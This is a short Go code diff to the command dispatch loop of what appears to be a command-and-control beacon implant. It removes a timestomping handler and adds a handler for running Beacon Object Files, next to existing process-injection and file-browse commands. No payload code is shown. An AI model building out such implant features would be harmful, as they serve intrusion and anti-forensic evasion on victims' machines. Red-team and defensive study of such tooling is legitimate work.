@@ -75,9 +75,6 @@ func main() {
 							case packet.CMD_TYPE_FILE_BROWSE:
 								result, err = services.CmdFileBrowse(cmdBuf)
 								callbackType = 22
-							case packet.CMD_TYPE_TIMESTOMP:
-								result, err = services.CmdTimeStomp(cmdBuf)
-								callbackType = 0
 							case packet.CMD_TYPE_CD:
 								result, err = services.CmdCd(cmdBuf)
 								callbackType = 0
@@ -190,6 +187,9 @@ func main() {
 								callbackType = 0
 							case packet.CMD_TYPE_INJECT_X86:
 								result, err = services.CmdInjectX86(cmdBuf)
+								callbackType = 0
+							case packet.CMD_TYPE_BOF:
+								result, err = services.CMDBof(cmdBuf)
 								callbackType = 0
 							default:
 								err = errors.New("This type is not supported now.")
